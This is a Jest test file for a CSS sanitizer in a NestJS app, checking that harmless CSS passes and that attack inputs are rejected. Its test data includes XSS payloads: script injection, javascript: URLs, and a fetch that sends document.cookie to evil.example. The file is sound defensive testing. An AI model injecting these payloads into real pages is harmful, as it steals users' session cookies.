/* eslint-disable prettier/prettier */
import { BadRequestException } from '@nestjs/common';
import { sanitizeCustomCss } from './css-sanitizer';

describe('sanitizeCustomCss', () => {
  it('passes through ordinary, harmless CSS unchanged', () => {
    const css = '.hero { color: #D97757; font-weight: bold; } .card:hover { transform: scale(1.02); }';
    expect(sanitizeCustomCss(css)).toBe(css);
  });

  it('treats null/undefined/empty string as "no custom CSS"', () => {
    expect(sanitizeCustomCss(null)).toBeNull();
    expect(sanitizeCustomCss(undefined)).toBeNull();
    expect(sanitizeCustomCss('')).toBeNull();
  });

  it.each([
    ['@import url("https://evil.example/steal.css");'],
    ["div { background: url(javascript:alert(1)); }"],
    ['.x { width: expression(alert(1)); }'],
    ['</style><script>alert(document.cookie)</script>'],
    ['.x::after { content: "x"; } <script>fetch("https://evil.example?c="+document.cookie)</script>'],
    ['a { color: red; } <iframe src="https://evil.example"></iframe>'],
    ['a[href^="javascript:"] { color: red; }'],
  ])('rejects a known attack pattern: %s', (attack) => {
    expect(() => sanitizeCustomCss(attack)).toThrow(BadRequestException);
  });

  it('rejects CSS over the length cap', () => {
    const huge = '.x{color:red}'.repeat(2000); // well over 20,000 chars
    expect(() => sanitizeCustomCss(huge)).toThrow(BadRequestException);
  });

  it('rejects a non-string value', () => {
    expect(() => sanitizeCustomCss(12345 as any)).toThrow(BadRequestException);
  });
});
